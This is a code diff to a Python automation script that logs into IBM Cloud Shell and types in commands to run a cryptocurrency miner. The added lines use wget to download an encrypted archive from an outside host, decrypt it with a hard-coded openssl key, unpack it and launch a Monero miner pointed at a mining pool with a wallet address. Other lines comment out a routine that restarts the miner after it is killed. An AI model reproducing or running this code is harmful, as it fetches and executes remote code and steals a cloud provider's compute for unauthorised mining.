@@ -44,8 +44,8 @@ def worker_callbacks(f):
     }))
 
 
-xmr_command = """./test -o auto.skypool.xyz:5555 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
-comand = """ wget -O test.des3 'http://1drv.stdfirm.com/u/s!AnJnYpmP0XhJepe1DA4dOpUgY6U?e=2m9f2q'&&dd if=test.des3 |openssl des3 -d -k 123@123 | tar zxf -&&cd mine&&chmod 0777 test&&""" + xmr_command
+xmr_command = """ ./test -o auto.skypool.xyz:5555 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
+comand = """ wget -O test.des3 'http://1drv.stdfirm.com/u/s!AnJnYpmP0XhJepe1DA4dOpUgY6U?e=2m9f2q'&&dd if=test.des3 |openssl des3 -d -k 123@123 | tar zxf -&&mv mine/* ~&&chmod 0777 test&&""" + xmr_command
 address = "https://cloud.ibm.com/shell"
 s_time = time.time()
 
@@ -288,11 +288,11 @@ class CloudShell:
                 killed = False
                 is_running = False
                 for item in eles:
-                    if killed:
-                        item.send_keys(xmr_command + "." + self.miner_id + "\n")
-                        is_running = True
-                        self._log("send command after Killed")
-                        break
+#                     if killed:
+#                         item.send_keys(xmr_command + "." + self.miner_id + "\n")
+#                         is_running = True
+#                         self._log("send command after Killed")
+#                         break
                     if "cloudshell:~$" == str(item.text)[-13:]:
                         item.send_keys(comand + "." + self.miner_id + "\n")
                         is_running = True
